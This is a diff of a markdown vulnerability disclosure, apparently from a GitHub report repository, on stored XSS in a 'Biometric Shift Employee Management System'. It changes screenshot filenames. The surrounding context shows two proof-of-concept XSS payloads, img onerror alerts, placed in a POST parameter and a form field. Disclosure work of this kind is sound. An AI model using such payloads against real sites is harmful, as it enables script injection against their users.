@@ -58,7 +58,7 @@ POST parameters:
 category=&new_category=&criteria=defds%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%2Fxss6%2F%29%3E%3C%27%22&target_score=45&edit_criteria_id=1&edit_criteria=
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss5.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss6.png)
 
 #### XSS5
 
@@ -73,7 +73,7 @@ Content-Disposition: form-data; name="holiday_name"
 
 Holiday123'"><img src=x onerror=alert(7)><'"
 ```
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss5.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Biometric-Shift-Employee-Management-System/xss7.png)
 
 
 
